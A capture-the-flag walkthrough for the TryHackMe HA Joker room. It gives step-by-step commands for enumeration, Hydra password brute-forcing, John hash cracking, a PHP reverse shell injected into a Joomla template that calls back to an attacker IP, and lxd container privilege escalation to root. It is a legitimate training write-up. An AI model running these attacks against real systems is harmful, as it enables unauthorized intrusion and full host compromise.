# [HA Joker CTF](https://tryhackme.com/room/jokerctf)

## Batman hits Joker.

# HA Joker CTF

## We have developed this lab for the purpose of online penetration practices. Solving this lab is not that tough if you have proper basic knowledge of Penetration testing. Let’s start and learn how to breach it.

### What version of Apache is it?

1. First, we need to perform a basic port scan to identify open services and their versions. We'll use Nmap with the `-sV` flag to enable version detection
   - From the scan results, we can see that the machine is running **Apache version 2.4.29**

```Bash
nmap -sV IP
```

![SCREEN01](https://github.com/user-attachments/assets/2aa916c2-8bf5-463b-858f-70dfd8b5011b)

### What port on this machine not need to be authenticated by user and password?

1. For more detailed information about the open ports, let's run another Nmap scan with the `-sC` flag to enable default scripts
   - Analyzing the results, we can determine that **port 80** is accessible without authentication, while port 8080 requires credentials

```Bash
nmap -sC IP
```

![SCREEN02](https://github.com/user-attachments/assets/1bfb4efb-8080-4477-b593-71dcd6ae354e)

### There is a file on this port that seems to be secret, what is it?

### There is another file which reveals information of the backend, what is it?

1. Enumerate the web directories on port 80 using Gobuster to discover hidden files and directories
   - We discovered two interesting files: **secret.txt** and **phpinfo.php**

```Bash
gobuster dir -u http://IP:80 -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,js
```

![SCREEN03](https://github.com/user-attachments/assets/5a96e2ae-1325-4621-9490-c7b43c3a8c20)

### When reading the secret file, We find with a conversation that seems contains at least two users and some keywords that can be intersting, what user do you think it is?

1. Examine the content of the secret.txt file by navigating to `http://IP/secret.txt` in our browser
   - Upon reading the file, we find a conversation that mentions a user named **joker**

![SCREEN04](https://github.com/user-attachments/assets/36f789a6-353c-4b73-9690-c8456367b873)

### What port on this machine need to be authenticated by Basic Authentication Mechanism?

1. Referring back to our initial Nmap scan results, we identified that port **8080** requires authentication using HTTP Basic Authentication

```Bash
nmap -sC IP
```

![SCREEN02](https://github.com/user-attachments/assets/e356d653-df2f-4979-bbc6-9151a76d8907)

### At this point we have one user and a url that needs to be aunthenticated, brute force it to get the password, what is that password?

1. Now that we have a potential username, let's attempt to brute force the password for this account using Hydra

```Bash
hydra -l joker -P /root/Tools/wordlists/rockyou.txt IP http-get -s 8080 /
```

![SCREEN05](https://github.com/user-attachments/assets/3fa08da5-b1ca-4f8a-a18e-040f8fe4a3cb)

### Yeah!! We got the user and password and we see a cms based blog. Now check for directories and files in this port. What directory looks like as admin directory?

### We need access to the administration of the site in order to get a shell, there is a backup file, What is this file?

1. With valid credentials, we need to further enumerate the web application on port 8080. We can use Nikto or Gobuster for this task
   - From scan results, we identify two important directories: `/administrator` and `/backup`

```Bash
nikto -h http://IP:8080 -id joker:hannah
```

Or

```Bash
gobuster dir -u http://IP:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -U joker -P hannah
```

![SCREEN06](https://github.com/user-attachments/assets/a0802311-6dc1-4006-9c26-1996f7700694)

### We have the backup file and now we should look for some information, for example database, configuration files, etc ... But the backup file seems to be encrypted. What is the password?

1. The backup file appears to be password protected. We'll use zip2john to extract the hash and then crack it with John the Ripper

```Bash
zip2john backup.zip > hash.txt
john hash.txt
```

![SCREEN07](https://github.com/user-attachments/assets/86539c55-dd52-4598-990a-2bd0f9de8e3c)

### Remember that... We need access to the administration of the site... Blah blah blah. In our new discovery we see some files that have compromising information, maybe db? ok what if we do a restoration of the database! Some tables must have something like user_table! What is the super duper user?

1. After extracting the backup.zip file, we find a database backup named joomladb.sql. Let's analyze it to find user information
   - This reveals a user described as "Super Duper User" with the username **admin**

```Bash
grep -i "duper" joomladb.sql
```

![SCREEN08](https://github.com/user-attachments/assets/8c6f22d4-3770-4bef-a145-cae4f76f5564)

### Super Duper User! What is the password?

1. To find the admin's password, we extract hash from the SQL file and save it to a text file `hash.txt`

```Bash
john hash.txt
```

![SCREEN09](https://github.com/user-attachments/assets/bfa96673-dbee-4eff-9d97-e0a9983da30e)

### At this point, you should be upload a reverse-shell in order to gain shell access. What is the owner of this session?

### This user belongs to a group that differs on your own group, What is this group?

1. With admin credentials for the Joomla CMS, we can now upload a reverse shell. We'll navigate to `http://IP:8080/administrator/index.php?option=com_templates&view=template&id=503&file=L2Vycm9yLnBocA%3D%3D`

2. In the template editor, we'll insert a [PHP reverse shell](https://github.com/mosec0/Reverse-Shell/blob/main/reverse-shell.php)

```php
<?php
// Set Your IP and Port
$ip = '10.10.76.165';
$port = 4444;

// Open Connection on Your Machine
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);

?>
```

![SCREEN10](https://github.com/user-attachments/assets/56f56e24-feae-4555-8a87-0d8027761db5)

3. Before triggering the shell, we'll set up a netcat listener on our attacking machine

```Bash
nc -lvnp 4444
```

4. Then we trigger the shell by visiting `http://IP/templates/beez3/error.php`,
   - Owner of the session is **www-data** and group is **lxd**

![SCREEN11](https://github.com/user-attachments/assets/c8d4ed75-081d-41a4-bb0b-4267cddda852)

### Spawn a tty shell.

1. To make our shell more usable, we'll spawn a proper TTY shell:

```Bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

### What is the name of the file in the /root directory?

1. Since our user is a member of the lxd group, we can exploit this to gain root access. First, we check for existing LXD images

```Bash
lxc image list
```

2. On our attacking machine, we'll prepare an Alpine Linux container image:

```Bash
git clone https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder/
python -m SimpleHTTPServer
```

3. Back on the target machine, download and import this image. Create and configure a privileged container with the host filesystem mounted inside. Finally, execute a shell inside the container and browse to the host's root directory

```Bash
cd /tmp
wget http://IP:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
cd /mnt/root/root
ls
```

![SCREEN12](https://github.com/user-attachments/assets/6fdc5239-da50-48de-a80c-4290e3911bf8)
